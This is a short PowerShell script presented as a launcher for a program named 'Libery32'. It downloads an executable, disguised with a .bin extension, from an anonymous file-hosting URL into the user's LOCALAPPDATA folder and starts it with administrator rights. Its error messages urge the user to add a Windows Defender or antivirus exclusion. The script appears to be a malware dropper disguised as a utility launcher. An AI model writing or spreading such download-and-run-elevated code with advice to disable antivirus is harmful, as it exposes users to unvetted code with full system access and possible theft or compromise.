# Libery32 launcher - copy this file as Libery32.ps1
# Does NOT delete exe after download (old script bug).

$ErrorActionPreference = 'Stop'

$exeName = 'Libery32.exe'
$installDir = Join-Path $env:LOCALAPPDATA 'Libery32'
$exePath = Join-Path $installDir $exeName

# Change URL if you host exe elsewhere.
$exeUrl = 'https://files.catbox.moe/nj6eg4.bin'

function Write-Status([string]$Text, [string]$Color = 'White') {
    Write-Host $Text -ForegroundColor $Color
}

function Resolve-ExePath {
  # 1) exe next to this .ps1 file
  $scriptDir = $PSScriptRoot
  if ([string]::IsNullOrWhiteSpace($scriptDir)) {
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
  }
  if (-not [string]::IsNullOrWhiteSpace($scriptDir)) {
    $localExe = Join-Path $scriptDir $exeName
    if (Test-Path $localExe) {
      return $localExe
    }
  }

  # 2) cached install
  if (Test-Path $exePath) {
    return $exePath
  }

  # 3) download to cache
  if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
  }

  Write-Status "Downloading: $exeUrl" Cyan
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
  Write-Status 'Downloaded' Green

  if (-not (Test-Path $exePath)) {
    throw 'Download failed - file not found.'
  }

  return $exePath
}

try {
  $targetExe = Resolve-ExePath
  Write-Status "Using: $targetExe" Green

  Write-Status 'Starting Libery32 (Administrator)...' Cyan
  $proc = Start-Process -FilePath $targetExe -Verb RunAs -PassThru
  if ($null -eq $proc) {
    throw 'Start-Process returned null.'
  }

  Start-Sleep -Seconds 2
  if ($proc.HasExited) {
    throw "Libery32 closed immediately (exit code $($proc.ExitCode)). Install VC++ x64 Redistributable and add Windows Defender exclusion."
  }

  Write-Status 'Libery32 is running.' Green
  Write-Status 'Finished' Green
}
catch {
  Write-Status "Error: $($_.Exception.Message)" Red
  Write-Status 'Fix: copy Libery32.exe to same folder as this .ps1, or add antivirus exclusion.' Yellow
}

Write-Host ''
Read-Host 'Press Enter to close'